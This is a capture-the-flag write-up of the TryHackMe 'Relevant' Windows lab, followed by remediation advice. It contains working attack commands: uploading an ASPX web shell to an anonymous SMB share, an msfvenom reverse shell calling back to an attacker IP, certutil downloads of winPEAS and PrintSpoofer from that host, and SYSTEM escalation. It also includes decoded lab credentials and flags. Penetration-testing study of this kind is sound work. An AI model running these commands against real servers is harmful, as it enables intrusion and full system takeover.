# Write-up: Relevant lab on THM

This document is a structured security write-up based on hands-on exploitation of the **Relevant** lab on TryHackMe website: https://tryhackme.com/room/relevant

**Date**: January 14, 2026  
**Source**: TryHackMe — Relevant & Personal Study Notes

---

## Summary

Standalone workgroup web server **"Relevant"** was fully compromised by the next **few steps**:  
* Share **"nt4wrksv"** is writable for **any** anonymous in smbclient — it's easy **Remote Code Execution**.
* Remote Code Execution -> **Reverse Shell** -> full ability of machine movement for a hacker and full ability of privilege escalation vector research — comfortable and **easy POST work** for a hacker.
* **Critical** Windows server **misconfiguration** — user **"iis apppool\defaultapppool"** has privilege **"SeImpersonatePrivilege"**, what means a hacker can run **"PrintSpoofer"** and get a **SYSTEM** (full access to the server) easy and fast.
* **As result** — a hacker got the **SYSTEM** and standalone web server "Relevant" was **fully compromised**.

---

## Technical Overview
### 1. Discovery

Start like always:  
```bash
$ sudo nmap -sC -sV -v -Pn -p- 10.80.131.73
```

Results:  
<img width="680" height="470" alt="Screenshot 2026-01-14 184023" src="https://github.com/user-attachments/assets/1d23cf8b-38d1-4ea3-b42a-c727efa7ef9f" />

*Here is standalone web server **"Relevant"**.*

---

Look for **http** port 80:  
* **http://10.80.131.73** — stock Windows Server 2016 web page, nothing interesting in there.

<img width="1920" height="901" alt="web" src="https://github.com/user-attachments/assets/4382e86d-3ffc-4596-ae46-84aec2cbe3f2" />

Check it out with fuzzing:  
```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt:FUZZ -u "http://10.80.131.73/FUZZ" -ic -c
```

<img width="1199" height="518" alt="Screenshot 2026-01-14 183727" src="https://github.com/user-attachments/assets/f5a90f00-b54d-4213-8e71-18f9103b577c" />

*Nothing.*

---

Look for available shares:  
```bash
$ smbclient -L //10.80.131.73/ -N
```

Result:  
<img width="599" height="179" alt="Screenshot 2026-01-14 183813" src="https://github.com/user-attachments/assets/ab2717d6-7d6a-4366-a4aa-98e0cb89d3da" />

Catch it. **"nt4wrksv"** it's someting interesting.

```bash
$ smbclient //10.80.131.73/nt4wrksv -N
```

```powershell
smb: \> ls
```

<img width="868" height="206" alt="Screenshot 2026-01-14 183839" src="https://github.com/user-attachments/assets/77da5b5c-953e-401a-803f-9f249c3fc4ad" />

```powershell
> mget passwords.txt
```

```bash
$ cat passwords.txt
```

```text
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Go to https://gchq.github.io/CyberChef:  

<img width="1920" height="932" alt="Screenshot 2026-01-14 183928" src="https://github.com/user-attachments/assets/2bea3bda-1753-4f26-99e1-bbb9ba6ae8ef" />

```text
From Base64:
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```

*Some credentials.*

Verify Bob's credentials:  
```bash
$ nxc smb 10.80.131.73 -u 'Bob' -p '!P@$$W0rD!123'
```

Bob **positive**:  
```text
[+] Relevant\Bob:!P@$$W0rD!123
```

Verify Bill's credentials: 

```bash
$ nxc smb 10.80.131.73 -u 'Bill' -p 'Juw4nnaM4n420696969!$$$'
```

Bill **positive**:  
```text
[+] Relevant\Bill:Juw4nnaM4n420696969!$$$ (Guest)
```

*Two users in our pocket.*

---

```bash
$ nxc rdp 10.80.131.73 -u 'Bob' -p '!P@$$W0rD!123'
```

```bash
$ nxc rdp 10.80.131.73 -u 'Bill' -p 'Juw4nnaM4n420696969!$$$'
```

**No RDP** for both.

**But there is one critical thing — we can write in the share "nt4wrksv" as anonymous, that means no account required for RCE.**

---

### 2. Penetration

Check for RCE first:  
```text
/usr/share/webshells/aspx/cmdasp.aspx -> smbclient
```

```powershell
> put cmdasp.aspx
```

<img width="852" height="190" alt="put" src="https://github.com/user-attachments/assets/c79eeedd-970d-4b0f-804f-de00170dd918" />

Navigate: http://10.80.131.73:49663/nt4wrksv/cmdasp.aspx

<img width="720" height="158" alt="netcat" src="https://github.com/user-attachments/assets/d226ffe3-c9ad-4ddd-8dff-521443d75fff" />

Then in the **netcat** shell:
```text
whoami
```

```text
"iis apppool\defaultapppool"
```

*There is RCE.*

---

Create **reverse shell** via msfvenom:  
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.144.226 LPORT=4444 -f aspx -o shell.aspx
```

Then move **shell.aspx** -> smbclient:

```powershell
> put shell.aspx
```

Navigate: http://10.80.131.73:49663/nt4wrksv/shell.aspx

*Catch the reverse shell in netcat.*

```text
c:\Users\Bob\Desktop>type user.txt
```

**User Flag**:  
```text
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

*User Flag in our pocket. Light weight, baby*

---

### 3. Escalation


Send **"winPEAS"** to the target:  
```powershell
certutil -urlcache -split -f http://192.168.144.226/winPEAS.ps1 wp.ps1
```

Run it:  
```powershell
powershell -ep bypass
```

```powershell
powershell .\wp.ps1 > output.txt
```

output.txt:  

<img width="840" height="464" alt="priv" src="https://github.com/user-attachments/assets/a23474f4-9a67-4cf7-879d-4448a31e5305" />

```text
Privilege "SeImpersonatePrivilege" is Enabled
```

*We can run "PrintSpoofer" and get the SYSTEM via "potato" vector.*

---

```powershell
certutil -urlcache -split -f http://192.168.144.226/PrintSpoofer64.exe PS64.exe
```

```powershell
> PS64.exe -i -c cmd
```

<img width="604" height="262" alt="whoami" src="https://github.com/user-attachments/assets/a6c0010c-09b9-4763-b8eb-c3023faa8994" />

```powershell
C:\Users\Administrator\Desktop>type root.txt
```

Root Flag:  

<img width="515" height="100" alt="rootfl" src="https://github.com/user-attachments/assets/2cf3f7b8-281e-41fe-8ec9-7f65be3e1e80" />

```text
THM{1fk5kf469devly1gl320zafgl345pv}
```

---

## Security Failures & Root Causes Classification

* **Access Control** — Anonymous Write Access on SMB Share — **Critical** impact — The "nt4wrksv" share was configured with "Full Control" or "Write" permissions for anonymous/guest users, allowing the upload of malicious .aspx payloads.
* **Improper Authorization** — Excessive Service Account Privileges — **High** impact — The "iis apppool\defaultapppool" account held "SeImpersonatePrivilege", which is unnecessary for standard web operations and enables token impersonation attacks.
* **Information Disclosure** — Cleartext/Base64 Credentials in Share — **Medium** impact — Sensitive data (passwords.txt) was stored in a publicly accessible directory — Base64 is an encoding, not encryption, providing no security.
* **Configuration Management** — Insecure Default IIS Deployment — **Medium** impact — The web server was running with default configurations and mapping high-numbered ports (49663) to sensitive SMB directories, increasing the attack surface.

---

## Remediation Recommendations

* **Disable** anonymous/guest access on all SMB shares.
* **Remove** "SeImpersonatePrivilege" from service accounts where not strictly required.
* **Implement** Group Managed Service Accounts (gMSAs) to handle service permissions securely.
* **Enforce** strict NTFS permissions to prevent web-writable directories.
* **Prohibit** cleartext or encoded credential storage in shared folders.
* **Audit** privilege assignments regularly to prevent privilege creep on default app pools.

---

## Conclusion

> This lab demonstrates how misconfiguration beats exploitation. No sophisticated malware or memory corruption was required — only the abuse of over-privileged trust relationships and weak operational discipline. By exposing a writable SMB share and granting a web service account unnecessary impersonation rights, the server provided a clear, repeatable path from anonymous access to full SYSTEM compromise. This attack path is a realistic and devastating reminder that security is only as strong as its most basic configuration.

---

*Write-up compiled based on TryHackMe Relevant (https://tryhackme.com/room/relevant) lab.*
